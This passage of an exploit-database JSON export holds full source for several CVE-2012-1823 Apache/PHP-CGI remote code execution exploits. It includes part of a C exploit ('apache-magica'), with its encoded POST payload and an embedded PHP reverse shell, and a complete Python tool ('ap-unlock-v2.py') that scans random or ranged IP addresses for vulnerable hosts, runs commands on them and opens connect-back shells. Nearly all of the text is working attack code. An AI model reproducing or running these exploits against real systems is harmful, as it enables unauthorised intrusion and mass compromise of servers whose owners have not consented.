\t}\r\n        break;\r\n       case 1:\r\n        if(optarg)\r\n\t     port = atoi(optarg);\r\n        break;\r\n       case 2:\r\n        protocol = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!protocol) {\r\n\t     printf(&quot;calloc error (3)\\n&quot;);\r\n         exit(255);\r\n        }\r\n        memcpy(protocol, optarg, strlen(optarg)+1);\r\n        if (!strcmp(protocol, &quot;https&quot;))\r\n         httpsflag=1;\r\n        break;\r\n       case 3:\r\n        reverseip = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!reverseip) {\r\n\t     printf(&quot;calloc error (4)\\n&quot;);\r\n         exit(255);\r\n        }\r\n        memcpy(reverseip, optarg, strlen(optarg)+1);       \r\n        break;\r\n       case 4:\r\n\t    reverseport = atoi(optarg);       \r\n\t\treverseportstr = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!reverseportstr) {\r\n\t     printf(&quot;calloc error (5)\\n&quot;);\r\n         exit(255);\r\n        }\r\n        memcpy(reverseportstr, optarg, strlen(optarg)+1);  \t     \r\n        break;\r\n       case 5:\r\n        forceinterpreter = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!forceinterpreter) {\r\n\t     printf(&quot;calloc error (6)\\n&quot;);\r\n         exit(255);\r\n        }\r\n        memcpy(forceinterpreter, optarg, strlen(optarg)+1);       \r\n        break;\r\n       default:\r\n        usage(argv);\r\n\t  }\r\n\t  break;\r\n\t \r\n\t default:\r\n\t  usage(argv);\r\n     }\r\n  }\r\n\r\n  if ((optind &lt; argc) || !target || !protocol || !port ||\r\n      !reverseip || !reverseport){\r\n\tusage(argv);\r\n  }\r\n  \r\n  server = gethostbyname_(target, port);\r\n  if (!server) {\r\n   printf(&quot;Error while resolving hostname. (7)\\n&quot;);\r\n   exit(255);\r\n  }\r\n\r\n  char *interpreters[5];\r\n  int ninterpreters = 5;\r\n  interpreters[0] = strdup(&quot;/cgi-bin/php&quot;);\r\n  interpreters[1] = strdup(&quot;/cgi-bin/php5&quot;);\r\n  interpreters[2] = strdup(&quot;/cgi-bin/php-cgi&quot;);\r\n  interpreters[3] = strdup(&quot;/cgi-bin/php.cgi&quot;);\r\n  interpreters[4] = strdup(&quot;/cgi-bin/php4&quot;);\r\n  \r\n  for (i=0;i&lt;ninterpreters;i++) {\r\n   interpreter = interpreters[i];\r\n   if (forceinterpreter) {\r\n     interpreter = strdup(forceinterpreter);\r\n   }\r\n   if (forceinterpreter &amp;&amp; i)\r\n    break;\r\n   printf(&quot;%s\\n&quot;, interpreter);\r\n   \r\n   sockfd = socket(AF_INET, SOCK_STREAM, 0);\r\n   if (sockfd &lt; 1) { \r\n\t printf(&quot;socket error (8)\\n&quot;);\r\n\t exit(255);\r\n   }\r\n  \r\n   if (connect(sockfd, (void*)server, sizeof(struct sockaddr_in)) &lt; 0) {\r\n    printf(&quot;connect error (9)\\n&quot;);\r\n    exit(255);\t  \r\n   }\r\n   if (httpsflag) {\r\n    sslconnection = (connection*) malloc(sizeof(connection));\r\n    if (!sslconnection) {\r\n     printf(&quot;malloc error (10)\\n&quot;);\r\n     exit(255);   \r\n    }\r\n    sslconnection-&gt;handle = NULL;\r\n    sslconnection-&gt;ctx = NULL;\r\n\r\n    SSL_library_init();\r\n\r\n    sslconnection-&gt;ctx = SSL_CTX_new(SSLv23_client_method());\r\n    if (!sslconnection-&gt;ctx) {\r\n \t printf(&quot;SSL_CTX_new error (11)\\n&quot;);\r\n     exit(255);\r\n    }\r\n\r\n    sslconnection-&gt;handle = SSL_new(sslconnection-&gt;ctx);\r\n    if (!sslconnection-&gt;handle) {\r\n \t printf(&quot;SSL_new error (12)\\n&quot;);\r\n\t exit(255);   \r\n    }\r\n    if (!SSL_set_fd(sslconnection-&gt;handle, sockfd)) {\r\n \t printf(&quot;SSL_set_fd error (13)\\n&quot;);\r\n     exit(255);\r\n    }\r\n   \r\n    if (SSL_connect(sslconnection-&gt;handle) != 1) {\r\n\t printf(&quot;SSL_connect error (14)\\n&quot;);\r\n     exit(255);       \r\n    }\r\n   }\r\n  \r\n   tmpsize = strlen(phpstr) + strlen(reverseip) + strlen(reverseportstr) + 64;\r\n   tmpstr = (char*)calloc(tmpsize, sizeof(char));\r\n   snprintf(tmpstr, tmpsize, phpstr, reverseip, reverseport);\r\n   \r\n   writesize = strlen(target) + strlen(interpreter) + \r\n     strlen(poststr) + strlen(tmpstr) + 64;\r\n   writestr = (char*)calloc(writesize, sizeof(char));\r\n   snprintf(writestr, writesize, poststr, interpreter,\r\n     target, strlen(tmpstr), tmpstr);\r\n  \r\n   if (!httpsflag) {\r\n\t write(sockfd, writestr, strlen(writestr));\r\n\t readbuf = read_(sockfd);\r\n   } else {\r\n\t SSL_write(sslconnection-&gt;handle, writestr, strlen(writestr));\r\n\t readbuf = sslread(sslconnection);\r\n   }\r\n  \r\n   if (readbuf) {\r\n     printf(&quot;***SERVER RESPONSE***\\n\\n%s\\n\\n&quot;, readbuf);  \r\n   } else {\r\n    printf(&quot;read error (15)\\n&quot;);\r\n    exit(255);\t  \r\n   }\r\n  }\r\n  exit(1);\r\n}\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:61070"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2013-10-31T00:00:00",
            "published": "2013-10-31T00:00:00",
            "href": "https://packetstormsecurity.com/files/123859/Apache-PHP-5.x-Remote-Code-Execution-Python-Exploit-2.html",
            "id": "PACKETSTORM:123859",
            "type": "packetstorm",
            "title": "Apache + PHP 5.x Remote Code Execution Python Exploit #2",
            "sourceData": "`#!/usr/bin/env python  \n#  \n# ap-unlock-v2.py - apache + php 5.* rem0te c0de execution 0day (better version)  \n#  \n# NOTE:  \n# - quick'n'dirty VERY UGLYY C=000DEEE IZ N0T MY STYLE :(((  \n# - for connect back shell start netcat/nc and bind port on given host:port  \n# - is ip-range scanner not is multithreaded, but iz multithreaded iz in  \n# random scanner and is scanner from file (greets to MustLive)  \n# - no ssl support  \n# - more php paths can be added  \n# - adjust this shit for windows b0xes  \n#  \n# 2013  \n# by noptrix - http://nullsecurity.net/  \n  \nimport sys  \nimport socket  \nimport argparse  \nimport threading  \nimport time  \nimport random  \nimport select  \n  \n  \nNONE = 0  \nVULN = 1  \nSCMD = 2  \nXPLT = 3  \n  \nt3st = 'POST /cgi-bin/php/%63%67%69%6E/%70%68%70?%2D%64+%61%6C%75%6F%6E+%2D' \\  \n'%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73' \\  \n'%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+' \\  \n'%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+'\\  \n'%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1\\r\\nHost:localhost\\r\\n'\\  \n'Content-Type: text/html\\r\\nContent-Length:1\\r\\n\\r\\na\\r\\n'  \n  \n  \ndef m4ke_c0nn_b4ck_sh1t(cb_h0st, cb_p0rt):  \nc0nn_b4ck = \\  \n'''  \n<? set_time_limit (0); $VERSION = \"1.0\"; $ip = \"''' + cb_h0st + '''\";  \n$port = ''' + cb_p0rt + '''; $chunk_size = 1400; $write_a = null;  \n$error_a = null; $shell = \"unset HISTFILE; id; /bin/sh -i\"; $daemon = 0;  \n$debug = 0; if (function_exists(\"pcntl_fork\")) {$pid = pcntl_fork();  \nif ($pid == -1) {exit(1);}if ($pid) {exit(0);}if (posix_setsid() == -1) {  \nexit(1);}$daemon = 1;} else {print \"bla\";}chdir(\"/\");umask(0);  \n$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {  \nprintit(\"$errstr ($errno)\");exit(1);}$descriptorspec = array(  \n0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"),2 => array(\"pipe\", \"w\"));  \n$process = proc_open($shell, $descriptorspec, $pipes);  \nif (!is_resource($process)) {exit(1);}stream_set_blocking($pipes[1], 0);  \nstream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);  \nprintit(\"Successfully opened reverse shell to $ip:$port\");while (1) {  \nif (feof($sock)) {printit(\"ERROR: Shell connection terminated\");break;}  \nif (feof($pipes[1])) {printit(\"ERROR: Shell process terminated\");break;}  \n$read_a = array($sock, $pipes[1], $pipes[2]);  \n$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);  \nif (in_array($sock, $read_a)) {if ($debug) printit(\"SOCK READ\");  \n$input = fread($sock, $chunk_size);if ($debug) printit(\"SOCK: $input\");  \nfwrite($pipes[0], $input);}if (in_array($pipes[1], $read_a)) {  \nif ($debug) printit(\"STDOUT READ\");$input = fread($pipes[1], $chunk_size);  \nif ($debug) printit(\"STDOUT: $input\");fwrite($sock, $input);}  \nif (in_array($pipes[2], $read_a)) {if ($debug) printit(\"STDERR READ\");  \n$input = fread($pipes[2], $chunk_size);  \nif ($debug) printit(\"STDERR: $input\");fwrite($sock, $input);}}fclose($sock);  \nfclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);  \nfunction printit ($string) {if (!$daemon) {print \"$string\\n\";}}?>  \n'''  \nreturn c0nn_b4ck  \n  \n  \ndef enc0dez():  \nn33dz1 = ('cgi-bin', 'php')  \nn33dz2 = ('-d', 'allow_url_include=on', '-d', 'safe_mode=off', '-d',  \n'suhosin.simulation=on', '-d', 'disable_functions=\"\"', '-d',  \n'open_basedir=none', '-d', 'auto_prepend_file=php://input',  \n'-d', 'cgi.force_redirect=0', '-d', 'cgi.redirect_status_env=0',  \n'-d', 'auto_prepend_file=php://input', '-n')  \nfl4g = 0  \narg5 = ''  \np4th = ''  \nplus = ''  \n  \nfor x in n33dz2:  \nif fl4g == 1:  \nplus = '+'  \narg5 = arg5 + plus + \\  \n''.join('%' + c.encode('utf-8').encode('hex') for c in x)  \nfl4g = 1  \nfor x in n33dz1:  \np4th = p4th + '/' + \\  \n''.join('%' + c.encode('utf-8').encode('hex') for c in x)  \nreturn (p4th.upper(), arg5.upper())  \n  \n  \ndef m4k3_p4yl0rd(p4yl0rd, m0de):  \np4th, arg5 = enc0dez()  \nif m0de == VULN:  \np4yl0rd = t3st  \nelif m0de == SCMD or m0de == XPLT:  \np4yl0rd = 'POST /' + p4th + '?' + arg5 + ' HTTP/1.1\\r\\n' \\  \n'Host: ' + sys.argv[1] + '\\r\\n' \\  \n'Content-Type: application/x-www-form-urlencoded\\r\\n' \\  \n'Content-Length: ' + str(len(p4yl0rd)) + '\\r\\n\\r\\n' + p4yl0rd  \nreturn p4yl0rd  \n  \n  \ndef s3nd_sh1t(args, m0de, c0nn_b4ck):  \npat = '<b>Parse error</b>:'  \ntry:  \ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  \ns.settimeout(float(args.t))  \nres = s.connect_ex((args.h, int(args.p)))  \nif res == 0:  \nif m0de == VULN:  \np4yl0rd = m4k3_p4yl0rd('', m0de)  \ns.sendall(p4yl0rd)  \nif pat in s.recv(4096):  \nprint \"--> \" + args.h + \" vu1n\"  \nreturn args.h  \nelse:  \nif args.v:  \nprint \"--> %s n0t vu1n\" % (args.h)  \nreturn  \nelif m0de == SCMD:  \np4yl0rd = m4k3_p4yl0rd('<? system(\"' + args.c + '\"); ?>', m0de)  \ns.sendall(p4yl0rd)  \nrd, wd, ex = select.select([s], [], [], float(args.t))  \nif rd:  \nfor line in s.makefile():  \nprint line,  \nelif m0de == XPLT:  \np4yl0rd = m4k3_p4yl0rd(c0nn_b4ck, m0de)  \ns.sendall(p4yl0rd)  \nelse:  \nif args.v:  \nprint \"--> n0 w3bs3rv3r 0n %s\" % (args.h)  \nexcept socket.error:  \nreturn  \nreturn  \n  \n  \ndef m4k3_r4nd_1p4ddr(num):  \nh0sts = []  \nfor x in range(int(num)):  \nh0sts.append('%d.%d.%d.%d' % (random.randrange(0,255),  \nrandom.randrange(0,255), random.randrange(0,255),  \nrandom.randrange(0,255)))  \nreturn h0sts  \n  \n  \ndef sc4n_r4nd0m(args, h0st, m0de, vu1nz):  \nargs.h = h0st  \nvu1nz.append(s3nd_sh1t(args, m0de, None))  \nvu1nz = filter(None, vu1nz)  \nreturn  \n  \n  \ndef sc4n_fr0m_f1le(args, h0st, m0de, vu1nz):  \nargs.h = h0st.rstrip()  \nvu1nz.append(s3nd_sh1t(args, m0de, None))  \nvu1nz = filter(None, vu1nz)  \nreturn  \n  \n  \ndef sc4n_r4ng3(rsa, rsb, args, m0de):  \nvu1nz = []  \nfor i in range (rsa[0], rsb[0]):  \nfor j in range (rsa[1], rsb[1]):  \nfor k in range (rsa[2], rsb[2]):  \nfor l in range(rsa[3], rsb[3]):  \nargs.h = str(i) + \".\" + str(j) + \".\" + str(k) + \".\" + str(l)  \nvu1nz.append(s3nd_sh1t(args, m0de, None))  \ntime.sleep(0.005)  \nvu1nz = filter(None, vu1nz)  \nreturn vu1nz  \n  \n  \ndef m4k3_ipv4_r4ng3(iprange):  \na = tuple(part for part in iprange.split('.'))  \nrsa = (range(4))  \nrsb = (range(4))  \nfor i in range(0,4):  \nga = a[i].find('-')  \nif ga != -1:  \nrsa[i] = int(a[i][:ga])  \nrsb[i] = int(a[i][1+ga:]) + 1   \nelse:  \nrsa[i] = int(a[i])  \nrsb[i] = int(a[i]) + 1  \nreturn (rsa, rsb)  \n  \n  \ndef parse_args():  \np = argparse.ArgumentParser(  \nusage='\\n\\n ./ap-unlock-v2.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]'\\  \n'\\n ./ap-unlock-v2.py -r <4rg> | -R <4rg> | -i <4rg> [0pt1ons]',  \nformatter_class=argparse.RawDescriptionHelpFormatter, add_help=False)  \nopts = p.add_argument_group('0pt1ons', '')  \nopts.add_argument('-h', metavar='wh1t3h4tz.0rg',  \nhelp='| t3st s1ngle h0st f0r vu1n')  \nopts.add_argument('-p', default=80, metavar='80',  \nhelp='| t4rg3t p0rt (d3fau1t: 80)')  \nopts.add_argument('-c', metavar='\\'uname -a;id\\'',  \nhelp='| s3nd c0mm4nds t0 h0st')  \nopts.add_argument('-x', metavar='192.168.0.2:1337',  \nhelp='| c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll')  \nopts.add_argument('-s', action='store_true',  \nhelp='| t3st s1ngl3 h0st f0r vu1n')  \nopts.add_argument('-r', metavar='133.1.3-7.7-37',  \nhelp='| sc4nz iP addr3ss r4ng3 f0r vu1n')  \nopts.add_argument('-R', metavar='1337',  \nhelp='| sc4nz num r4nd0m h0st5 f0r vu1n')  \nopts.add_argument('-t', default=3, metavar='3',  \nhelp='| t1me0ut in s3x (d3fau1t: 3)')  \nopts.add_argument('-f', metavar='vu1n.lst',  \nhelp='| wr1t3 vu1n h0sts t0 f1l3')  \nopts.add_argument('-i', metavar='sc4nz.lst',  \nhelp='| sc4nz h0sts fr0m f1le f0r vu1n')  \nopts.add_argument('-S', metavar='2',  \nhelp='| sl33pz in s3x b3tw33n thr3adz (d3fault: 2)')  \nopts.add_argument('-T', default=2, metavar='4',  \nhelp='| nuM sc4n thr3adz (d3fault: 4)')  \nopts.add_argument('-v', action='store_true',  \nhelp='| pr1nt m0ah 1nf0z wh1l3 sh1tt1ng')  \nargs = p.parse_args()  \nif not args.h and not args.r and not args.R and not args.i:  \np.print_help()  \nsys.exit(0)  \nreturn args  \n  \n  \ndef wr1te_fil3(args, vu1nz):  \nif args.f:  \nif vu1nz:  \ntry:  \nf = open(args.f, \"w\")  \nf.write(\"\\n\".join(vu1nz)+\"\\n\")  \nf.close()  \nexcept:  \nsys.stderr.write('de1n3 mudd1 k0cht guT')  \nsys.stderr.write('\\n')  \nraise SystemExit()  \nreturn  \n  \n  \ndef c0ntr0ller():  \nvu1nz = []  \nm0de = NONE  \ntry:  \nargs = parse_args()  \nif not args.t:  \nargs.t = float(3)  \nif args.h:  \nif args.s:  \nprint \"[+] sc4nn1ng s1ngl3 h0st %s \" % (args.h)  \nm0de = VULN  \ns3nd_sh1t(args, m0de, None)  \nelif args.c:  \nprint \"[+] s3nd1ng c0mm4ndz t0 h0st %s \" % (args.h)  \nm0de = SCMD  \ns3nd_sh1t(args, m0de, None)  \nelif args.x:  \nprint \"[+] xpl0it1ng b0x %s \" % (args.h)  \nm0de = XPLT  \nif args.x.find(':') != -1:  \nif not args.x.split(':')[1]:  \nprint \"[-] 3rr0r: p0rt m1ss1ng\"  \nelse:  \ncb_h0st = args.x.split(':')[0]  \ncb_p0rt = args.x.split(':')[1]  \nelse:  \nprint \"[-] 3rr0r: <h0st>:<p0rt> y0u l4m3r\"  \nc0nn_b4ck = m4ke_c0nn_b4ck_sh1t(cb_h0st, cb_p0rt)  \ns3nd_sh1t(args, m0de, c0nn_b4ck)  \nelse:  \nprint \"[-] 3rr0r: m1ss1ng -s, -c 0r -x b1tch\"  \nsys.exit(-1)  \nif args.r:  \nprint \"[+] sc4nn1ng r4ng3 %s \" % (args.r)  \nm0de = VULN  \nrsa, rsb = m4k3_ipv4_r4ng3(args.r)  \nvu1nz = sc4n_r4ng3(rsa, rsb, args, m0de)  \nif args.R:  \nprint \"[+] sc4nn1ng %d r4nd0m b0xes\" % (int(args.R))  \nm0de = VULN  \nif not args.S:  \nargs.S = float(2)  \nh0sts = m4k3_r4nd_1p4ddr(int(args.R))  \nfor h0st in h0sts:  \ntry:  \nt = threading.Thread(target=sc4n_r4nd0m, args=(args, h0st,  \nm0de, vu1nz))  \nt.start()  \ntime.sleep(float(args.S))  \nwhile threading.activeCount() > int(args.T):  \ntime.sleep(2)  \nexcept:  \nsys.stdout.flush()  \nsys.stdout.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")  \nraise SystemExit  \nif args.i:  \nprint \"[+] sc4nn1ng b0xes fr0m f1le %s\" % (args.i)  \nm0de = VULN  \nh0sts = tuple(open(args.i, 'r'))  \nif not args.S:  \nargs.S = float(2)  \nfor h0st in h0sts:  \ntry:  \nt = threading.Thread(target=sc4n_fr0m_f1le, args=(args,  \nh0st, m0de, vu1nz))  \nt.start()  \ntime.sleep(float(args.S))  \nwhile threading.activeCount() > int(args.T):  \ntime.sleep(2)  \nexcept KeyboardInterrupt:  \nsys.stdout.flush()  \nsys.stdout.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")  \nraise SystemExit  \n#sc4n_fr0m_f1le(args, h0sts, m0de, vu1nz)  \nexcept KeyboardInterrupt:  \nsys.stdout.flush()  \nsys.stderr.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")  \nraise SystemExit  \nwr1te_fil3(args, vu1nz)  \n  \nreturn  \n  \n  \ndef m41n():  \nif __name__ == \"__main__\":  \nprint \"--==[ ap-unlock-v2.py by noptrix@nullsecurity.net ]==--\"  \nc0ntr0ller()  \nelse:  \nprint \"[-] 3rr0r: y0u fuck3d up dud3\"  \nsys.exit(1)  \nprint \"[+] h0p3 1t h3lp3d\"  \n  \n  \n# \\o/ fr33 requiem 1337 h4x0rs ...   \nm41n()  \n  \n# e0F  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:123859"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache / PHP 5.x - cgi-bin Remote Code Execution Exploit. CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for linux platform",
            "modified": "2013-10-29T00:00:00",
            "published": "2013-10-29T00:00:00",
            "id": "EDB-ID:29290",
            "href": "https://www.exploit-db.com/exploits/29290/",
            "type": "exploitdb",
            "title": "Apache / PHP 5.x - cgi-bin Remote Code Execution Exploit",
            "sourceData": "/* Apache Magica by Kingcope */\r\n/* gcc apache-magika.c -o apache-magika -lssl */\r\n/* This is a code execution bug in the combination of Apache and PHP.\r\nOn Debian and Ubuntu the vulnerability is present in the default install\r\nof the php5-cgi package. When the php5-cgi package is installed on Debian and\r\nUbuntu or php-cgi is installed manually the php-cgi binary is accessible under\r\n/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute\r\nthe binary because this binary has a security check enabled when installed with\r\nApache http server and this security check is circumvented by the exploit.\r\nWhen accessing the php-cgi binary the security check will block the request and\r\nwill not execute the binary.\r\nIn the source code file sapi/cgi/cgi_main.c of PHP we can see that the security\r\ncheck is done when the php.ini configuration setting cgi.force_redirect is set\r\nand the php.ini configuration setting cgi.redirect_status_env is set to no.\r\nThis makes it possible to execute the binary bypassing the Security check by\r\nsetting these two php.ini settings.\r\nPrior to this code for the Security check getopt is called and it is possible\r\nto set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the\r\n-d switch. If both values are set to zero and the request is sent to the server\r\nphp-cgi gets fully executed and we can use the payload in the POST data field\r\nto execute arbitrary php and therefore we can execute programs on the system.\r\napache-magika.c is an exploit that does exactly the prior described. It does\r\nsupport SSL.\r\n/* Affected and tested versions\r\nPHP 5.3.10\r\nPHP 5.3.8-1\r\nPHP 5.3.6-13\r\nPHP 5.3.3\r\nPHP 5.2.17\r\nPHP 5.2.11\r\nPHP 5.2.6-3\r\nPHP 5.2.6+lenny16 with Suhosin-Patch\r\nAffected versions\r\nPHP prior to 5.3.12\r\nPHP prior to 5.4.2\r\nUnaffected versions\r\nPHP 4 - getopt parser unexploitable\r\nPHP 5.3.12 and up\r\nPHP 5.4.2 and up\r\nUnaffected versions are patched by CVE-2012-1823.\r\n*/\r\n/*    .\r\n     /'\\rrq rk\r\n .  // \\\\  .\r\n.x.//fco\\\\-|-\r\n '//cmtco\\\\zt\r\n //6meqrg.\\\\tq\r\n//_________\\\\'\r\nEJPGQO\r\napache-magica.c by Kingcope\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <getopt.h>\r\n#include <sys/types.h>\r\n#include <stddef.h>\r\n#include <openssl/rand.h>\r\n#include <openssl/ssl.h>\r\n#include <openssl/err.h>\r\n#include <netdb.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n\r\ntypedef struct {\r\n\tint sockfd;\r\n\tSSL *handle;\r\n\tSSL_CTX *ctx;\r\n} connection;\r\n\r\nvoid usage(char *argv[])\r\n{\r\n  printf(\"usage: %s <--target target> <--port port> <--protocol http|https> \" \\\r\n  \"<--reverse-ip ip> <--reverse-port port> [--force-interpreter interpreter]\\n\",\r\n   argv[0]);\r\n  exit(1);\r\n}\r\n\r\nchar poststr[] = \"POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F\" \\\r\n \"%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64\" \\\r\n \"+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73\" \\\r\n \"%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E\" \\\r\n \"%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63\" \\\r\n \"%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62\" \\\r\n \"%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74\" \\\r\n \"%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68\" \\\r\n \"%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F\" \\\r\n \"%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63\" \\\r\n \"%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73\" \\\r\n \"%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\\r\\n\" \\\r\n \"Host: %s\\r\\n\" \\\r\n \"User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26\" \\\r\n \"(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\\r\\n\" \\\r\n \"Content-Type: application/x-www-form-urlencoded\\r\\n\" \\\r\n \"Content-Length: %d\\r\\n\" \\\r\n \"Connection: close\\r\\n\\r\\n%s\";\r\nchar phpstr[] = \"<?php\\n\" \\\r\n\"set_time_limit(0);\\n\" \\\r\n\"$ip = '%s';\\n\" \\\r\n\"$port = %d;\\n\" \\\r\n\"$chunk_size = 1400;\\n\" \\\r\n\"$write_a = null;\\n\" \\\r\n\"$error_a = null;\\n\" \\\r\n\"$shell = 'unset HISTFILE; unset HISTSIZE; uname -a; w; id; /bin/sh -i';\\n\" \\\r\n\"$daemon = 0;\\n\" \\\r\n\"$debug = 0;\\n\" \\\r\n\"if (function_exists('pcntl_fork')) {\\n\" \\\r\n\"\t$pid = pcntl_fork();\t\\n\" \\\r\n\"\tif ($pid == -1) {\\n\" \\\r\n\"\t\tprintit(\\\"ERROR: Can't fork\\\");\\n\" \\\r\n\"\t\texit(1);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif ($pid) {\\n\" \\\r\n\"\t\texit(0);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif (posix_setsid() == -1) {\\n\" \\\r\n\"\t\tprintit(\\\"Error: Can't setsid()\\\");\\n\" \\\r\n\"\t\texit(1);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\t$daemon = 1;\\n\" \\\r\n\"} else {\\n\" \\\r\n\"\tprintit(\\\"WARNING: Failed to daemonise.\\\");\\n\" \\\r\n\"}\\n\" \\\r\n\"chdir(\\\"/\\\");\\n\" \\\r\n\"umask(0);\\n\" \\\r\n\"$sock = fsockopen($ip, $port, $errno, $errstr, 30);\\n\" \\\r\n\"if (!$sock) {\\n\" \\\r\n\"\tprintit(\\\"$errstr ($errno)\\\");\\n\" \\\r\n\"\texit(1);\\n\" \\\r\n\"}\\n\" \\\r\n\"$descriptorspec = array(\\n\" \\\r\n\"   0 => array(\\\"pipe\\\", \\\"r\\\"),\\n\" \\\r\n\"   1 => array(\\\"pipe\\\", \\\"w\\\"),\\n\" \\\r\n\"   2 => array(\\\"pipe\\\", \\\"w\\\")\\n\" \\\r\n\");\\n\" \\\r\n\"$process = proc_open($shell, $descriptorspec, $pipes);\\n\" \\\r\n\"if (!is_resource($process)) {\\n\" \\\r\n\"\tprintit(\\\"ERROR: Can't spawn shell\\\");\\n\" \\\r\n\"\texit(1);\\n\" \\\r\n\"}\\n\" \\\r\n\"stream_set_blocking($pipes[0], 0);\\n\" \\\r\n\"stream_set_blocking($pipes[1], 0);\\n\" \\\r\n\"stream_set_blocking($pipes[2], 0);\\n\" \\\r\n\"stream_set_blocking($sock, 0);\\n\" \\\r\n\"while (1) {\\n\" \\\r\n\"\tif (feof($sock)) {\\n\" \\\r\n\"\t\tprintit(\\\"ERROR: Shell connection terminated\\\");\\n\" \\\r\n\"\t\tbreak;\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif (feof($pipes[1])) {\\n\" \\\r\n\"\t\tprintit(\\\"ERROR: Shell process terminated\\\");\\n\" \\\r\n\"\t\tbreak;\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\t$read_a = array($sock, $pipes[1], $pipes[2]);\\n\" \\\r\n\"\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\\n\" \\\r\n\"\tif (in_array($sock, $read_a)) {\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"SOCK READ\\\");\\n\" \\\r\n\"\t\t$input = fread($sock, $chunk_size);\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"SOCK: $input\\\");\\n\" \\\r\n\"\t\tfwrite($pipes[0], $input);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif (in_array($pipes[1], $read_a)) {\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"STDOUT READ\\\");\\n\" \\\r\n\"\t\t$input = fread($pipes[1], $chunk_size);\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"STDOUT: $input\\\");\\n\" \\\r\n\"\t\tfwrite($sock, $input);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif (in_array($pipes[2], $read_a)) {\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"STDERR READ\\\");\\n\" \\\r\n\"\t\t$input = fread($pipes[2], $chunk_size);\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"STDERR: $input\\\");\\n\" \\\r\n\"\t\tfwrite($sock, $input);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"}\\n\" \\\r\n\"\\n\" \\\r\n\"fclose($sock);\\n\" \\\r\n\"fclose($pipes[0]);\\n\" \\\r\n\"fclose($pipes[1]);\\n\" \\\r\n\"fclose($pipes[2]);\\n\" \\\r\n\"proc_close($process);\\n\" \\\r\n\"function printit ($string) {\\n\" \\\r\n\"\tif (!$daemon) {\\n\" \\\r\n\"\t\tprint \\\"$string\\n\\\";\\n\" \\\r\n\"\t}\\n\" \\\r\n\"}\\n\" \\\r\n\"exit(1);\\n\" \\\r\n\"?>\";\r\n\r\nstruct sockaddr_in *gethostbyname_(char *hostname, unsigned short port)\r\n{\r\n struct hostent *he;\r\n struct sockaddr_in server, *servercopy;\r\n \r\n if ((he=gethostbyname(hostname)) == NULL) {\r\n  